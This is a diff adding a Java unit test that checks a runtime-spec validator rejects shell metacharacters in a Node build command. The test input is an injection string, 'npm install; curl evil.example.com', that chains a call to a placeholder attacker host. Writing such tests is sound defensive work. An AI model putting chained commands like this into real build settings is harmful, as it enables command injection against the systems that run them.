@@ -166,6 +166,23 @@ class RuntimeSpecResolverTest {
     }
 
     @Test
+    @DisplayName("校验拦住构建命令中能拼出注入的字符")
+    void validateRejectsShellMetacharactersInBuildCommand() {
+        RuntimeSpec spec = RuntimeSpec.builder()
+                .kind(RuntimeSpec.RuntimeKind.NODE)
+                .buildCommand("npm install; curl evil.example.com")
+                .processes(List.of(RuntimeSpec.ManagedProcess.builder()
+                        .name("web")
+                        .command("node app.js")
+                        .port(3000)
+                        .build()))
+                .primaryPort(3000)
+                .build();
+
+        assertThrows(MyException.class, () -> resolver.validate(spec, workspace));
+    }
+
+    @Test
     @DisplayName("校验拦住越界的工作目录")
     void validateRejectsEscapingWorkDir() {
         RuntimeSpec spec = RuntimeSpec.builder()
